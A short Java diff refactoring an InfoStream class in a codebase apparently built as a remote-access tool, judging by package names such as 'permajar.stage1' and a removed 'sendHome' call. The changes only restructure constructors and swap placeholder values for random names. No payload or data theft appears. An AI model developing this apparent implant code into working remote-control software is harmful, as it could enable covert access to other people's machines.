@@ -1,23 +1,20 @@
-package subterranean.crimson.universal.streams;
+package subterranean.crimson.universal.streams.infostream;
 
-import subterranean.crimson.permajar.stage1.network.Communications;
-import subterranean.crimson.server.commands.ClientCommands;
 import subterranean.crimson.server.graphics.panels.mainscreen.MainPane;
 import subterranean.crimson.server.network.Connection;
 import subterranean.crimson.universal.BMN;
 import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.containers.Message;
+import subterranean.crimson.universal.streams.Stream;
 
 public class InfoStream extends Stream {
 
-	public InfoStream(long p, boolean i, Connection c) {
-		super(p, i, c);
-		ClientCommands.startInfoStream(c, getStreamID(), p);
+	public InfoStream(ISParameters param) {
+		super(param);
 	}
 
-	public InfoStream(long p, boolean i) {
-		super(p, i);
-		start();
+	public InfoStream(ISParameters param, Connection c) {
+		super(param, c);
 	}
 
 	@Override
@@ -31,10 +28,10 @@ public class InfoStream extends Stream {
 	public void send() {
 		Message m = new Message(Utilities.randId(), BMN.STREAM_data);
 
-		Object[] o = { getStreamID(), "unknown", "unknown" };
+		Object[] o = { getStreamID(), Utilities.nameGen(4), Utilities.nameGen(4) };
 		m.auxObject = o;
 
-		Communications.sendHome(m);
+		sendMessage(m);
 	}
 
 }
